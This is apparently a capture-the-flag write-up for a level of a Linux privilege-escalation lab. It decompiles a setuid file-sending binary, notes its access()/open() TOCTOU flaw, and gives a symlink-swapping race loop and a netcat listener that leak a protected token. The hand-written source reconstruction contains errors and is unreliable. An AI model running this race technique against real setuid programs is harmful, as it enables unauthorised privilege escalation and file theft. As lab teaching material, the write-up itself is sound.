# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2010(level10) gid=2010(level10) groups=2010(level10),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

## Solution

We found two suspicious file:
- `/home/user/level10/level10` a binary with the setuid flag set.
- `/home/user/level10/token` a file would contain a sensible token. But it seems encoded or encrypted. 

### Privileges

We determined `/home/user/level10/level10` is a prime candidate for privilege escalation because:
- It is owned by `flag10` (our target).
- The group owner is `level10` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level10`, the privilege state is as follows:  
- Real UID: `level10`
- Real GUID: `level10`
- Effective UID: `flag10`
- Effective GUID: `level10`

```sh
$ getfacl ./level10 
# file: level10
# owner: flag10
# group: level10
# flags: ss-
user::rwx
group::---
group:level10:r-x
group:flag10:r-x
mask::r-x
other::r-x
```

`/home/user/level10/token` is only readable and writable by `flag10` so it would force us to use it's effective permissions.

### Script(s) behaviour(s)

We use [Ghidra](https://github.com/nationalsecurityagency/ghidra) to disassemble and analyze it's content to an equivalent of **C** to understand it's behaviour. 
```c
int main(int argc,char **argv) {
  char *param1;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined1 local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
                    /* Unresolved local var: char * file@[DW_OP_breg4(ESP): +40]
                       Unresolved local var: char * host@[DW_OP_breg4(ESP): +44] */
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = argv[1];
  param1 = argv[2];
  iVar2 = access(argv[1],4);
  if (iVar2 == 0) {
                    /* Unresolved local var: int fd@[DW_OP_breg4(ESP): +48]
                       Unresolved local var: int ffd@[DW_OP_breg4(ESP): +52]
                       Unresolved local var: int rc@[DW_OP_breg4(ESP): +56]
                       Unresolved local var: sockaddr_in sin@[DW_OP_breg4(ESP): +4156]
                       Unresolved local var: char[4096] buffer@[DW_OP_breg4(ESP): +60] */
    printf("Connecting to %s:6969 .. ",param1);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(param1);
    uVar1 = htons(0x1b39);
    local_24.sa_data[0] = (char)uVar1;
    local_24.sa_data[1] = (char)(uVar1 >> 8);
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",param1);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",param1);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}
```

Based on [Ghidra](https://github.com/nationalsecurityagency/ghidra)'s output, we tried to manually estimate and recover the source code.
```c
int main(int argc, char **argv) {
	if (argc < 3>) {
		printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
		exit(1);
	}

	char				*file = NULL;
	char				*host = NULL;
	const char			*banner = ".*( )*.\n";
	char				buffer[4096];
	int					fd = -1;
	int					ffd = -1;
	struct sockaddr_in	addr = {0};
	ssize_t				read_bytes;

	file = argv[1];
	host = argv[2];

	if (access(file, R_OK) != 0)
		return printf("You don\'t have access to %s\n", file);

	printf("Connecting to %s:6969 .. ", host);
	fflush(stdout);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(6969);
	addr.sin_addr.s_addr = inet_addr(host);

	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
		printf("Unable to connect to host %s\n", host);
		exit(1);
	}

	if (write(fd, banner, strlen(banner)) == -1) {
		printf("Unable to write banner to host %s\n", host);
		exit(1);
	}

	printf("Connected!\nSending file .. ");
	fflush(stdout);

	ffd = open(file, O_RDONLY);
	if (ffd == -1) {
		puts("Damn. Unable to open file");
		exit(1);
	}

	read_bytes = read(ffd, buffer, sizeof(buffer));
	if (read_bytes == -1) {
		fprintf(stderr, "Unable to read from file: %s\n", strerror(errno));
		exit(1);
	}

	write(fd, buffer, (size_t)read_bytes);
	iVar2 = puts("wrote file!");

	return 0;
}
```

### Vulnerability

We noticed that:
- `access()` operates over the `RUID`. In our case, that would be `level10`.
- `open()` operates over the `EUID`. In our case, that would be `flag10`.

This means that the program is technically authorized to open `/home/user/level10/token` as the current failure point relies solely on the `access()` call.

#### Tracing tools

In the **[previous exercice](../../level09/ressources/README.md)**, we noticed that **`ptrace()`** was used to prevent usage of tracing and debugging tools such as **[ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html)** and **[gdb](https://man7.org/linux/man-pages/man1/gdb.1.html)**.  
The current script **doesn't** ! Let's try to take advantage of that.

Using **[gdb](https://man7.org/linux/man-pages/man1/gdb.1.html)** we can control and alter the behaviour of the program.  
We **assumed** that GDB would inherit the setuid flag of the called script, but it doesn't.
```gdb
set confirm off
set pagination off
set print elements 0

###########
#  MACROS #
###########

define goto
    tbreak $arg0
    continue
end

define goto_exec
    goto $arg0
    finish
end

define goto_exec_assign
    goto_exec $arg0
    nexti
end

###########
# /MACROS #
###########

file /home/user/level10/level10
set args /home/user/level10/token localhost

start

# 1. Trick the program into thinking the `access()` call succeeded. Open will work due to the setuid flag.
goto_exec access
set $eax = 0

# 2. Instead of creating a network fd, let's create an fd to write the output to the desired file.
goto_exec_assign socket
call close(fd)
set $O_WRONLY = 01
set $O_CREAT = 0100
set $O_TRUNC = 01000
set fd = (int)open("/tmp/token", $O_WRONLY | $O_CREAT | $O_TRUNC, 0644)

p "Effective UID: "
p geteuid()

# 3. Skip the connect call
goto_exec connect
set $eax = 0

continue
exit 0
```

We then tried to attach gdb to the running process to bypass setuid limitations.
```sh
$ /home/user/level10/level10 /home/user/level10/token localhost & PID=$!; kill -SIGSTOP $PID; gdb -p $PID;
# ...
Could not attach to process.  If your uid matches the uid of the target
process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try
again as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf
ptrace: Operation not permitted.
# ...
```

Unfortunately [Yama](https://www.kernel.org/doc/html/v5.1/admin-guide/LSM/Yama.html) prevents us from doing that.  
We decided to scrape this approach here.

#### Race condition file reference swap.

We cannot influence the program’s behavior using debugging tools or tracers, nor can we modify its control flow.
However, we can influence its execution environment.
Although `argv[1]` remains fixed for the program’s lifetime, it may reference a symbolic link whose target we control.
By modifying this symlink, we can change the underlying file it points to.

This introduces a file-system **race condition**, where:

We would introduce a **race condition**, where:
- During `access()`, the symlink should point to a valid file.
- During `open()`, the symlink should point to `/home/user/level10/token`.

We cannot reliably control the program's execution flow (using `SIGSTOP` and `SIGCONT`for example) between these two function calls.
Instead, we rely on probabilistic exploitation by continuously swapping the symlink target and repeatedly executing the program until the race condition provides the expected output.
```sh
$ (
  while true; do
      ln -sf "$target_filepath_1" "$symlink_filepath";
      ln -sf "$target_filepath_2" "$symlink_filepath";
  done
) & pid="$!"
```

We also needed to provide a TCP server to listen for the response of the program.
```sh
$ stdbuf -o0 nc -lk "$host" "$port" > "$out_filepath" & pid="$!"
```

Please refer to [exploit.sh](./exploit.sh) for more details.  
And there is the flag !
